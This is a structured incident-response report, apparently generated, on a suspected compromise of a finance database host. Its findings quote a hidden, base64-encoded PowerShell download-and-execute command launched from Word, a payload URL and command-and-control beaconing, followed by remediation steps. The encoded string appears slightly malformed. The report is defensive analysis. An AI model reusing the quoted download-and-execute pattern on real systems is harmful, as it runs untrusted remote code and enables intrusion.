digest: A PowerShell process, spawned by winword.exe on FIN-DB-02, executed a base64-encoded command to download and execute a payload from hxxps://203.0.113.77/update.dat. This was immediately followed by periodic outbound connections to the same IP address, indicating Command and Control activity. The maintenance team confirmed no legitimate activity on FIN-DB-02, contradicting the case's initial 'routine maintenance' claim.

evidence_findings.title: Suspicious PowerShell Execution
evidence_findings.subject: FIN-DB-02
evidence_findings.evidence: A 'powershell.exe' process was observed on 'FIN-DB-02' with the command line 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZWJACkAbABpAGUAbgB0ACkA'. The parent process was 'winword.exe'.
evidence_findings.conclusion: The base64 encoded command decodes to 'IEX (New-Object Net.WebClient)', a common technique for downloading and executing content. The parent process 'winword.exe' is highly unusual for legitimate PowerShell execution, suggesting an initial compromise via a document.

evidence_findings.title: Download and Execute Payload
evidence_findings.subject: hxxps://203.0.113.77/update.dat
evidence_findings.evidence: A note associated with the PowerShell process states: 'Decoded content invokes Net.WebClient to download and execute hxxps://203.0.113.77/update.dat'.
evidence_findings.conclusion: The PowerShell command was designed to retrieve and execute a malicious payload from an external, untrusted source.

evidence_findings.title: Outbound Command and Control (C2) Connection
evidence_findings.evidence: Outbound network connections from '10.20.8.42' (FIN-DB-02) to '203.0.113.77' on port '443' were observed with '120' connections over '30' seconds. A note states: 'The destination is not in the corporate allowlist and was observed receiving periodic connections immediately after PowerShell execution.'
evidence_findings.conclusion: The periodic connections to an unapproved external IP immediately following the suspicious PowerShell execution strongly indicate Command and Control (C2) activity.

evidence_findings.title: Discrepancy with Stated Maintenance Activity
evidence_findings.subject: FIN-DB-02
evidence_findings.evidence: The case title and description claim 'Routine maintenance - known safe administrative activity' and 'Harmless approved maintenance.' However, a note states: 'No approved change references FIN-DB-02 or this command,' and 'The maintenance team confirmed it performed no work on FIN-DB-02.'
evidence_findings.conclusion: The technical evidence and confirmation from the maintenance team directly contradict the initial assessment, indicating malicious activity rather than legitimate maintenance.

attack_chain.description: An unknown mechanism, likely involving a malicious document, led to 'winword.exe' spawning 'powershell.exe'.
'powershell.exe' executed a base64-encoded command to download and execute a payload from an external server.
The compromised host 'FIN-DB-02' established periodic outbound connections to '203.0.113.77' on port 443, indicating C2 communication.

attack_timeline.attack_behavior: Download and execution of payload from 'hxxps://203.0.113.77/update.dat'.
Establishment of Command and Control (C2) connections to '203.0.113.77'.

ioc_indicators.context: Destination for payload download and C2 communications.
URL from which the malicious payload was downloaded.
Malicious PowerShell command used for execution.

remediations.description: Immediately isolate the host 'FIN-DB-02' from the network to prevent further compromise or lateral movement.
Block all traffic to and from '203.0.113.77' at the network perimeter (firewall, proxy, IPS).
Conduct a full forensic analysis of 'FIN-DB-02' to determine the extent of compromise, identify persistence mechanisms, and recover the 'update.dat' payload.
Investigate how 'winword.exe' spawned 'powershell.exe' to identify the initial access vector (e.g., phishing email, malicious document).
Search for other instances of connections to '203.0.113.77' or similar PowerShell execution patterns across the environment.

unknowns: The specific contents and capabilities of the 'update.dat' payload.
The exact initial access vector that led to 'winword.exe' executing PowerShell.
Whether other systems in the environment are also compromised by this threat.
The full scope and impact of the compromise on 'FIN-DB-02'.
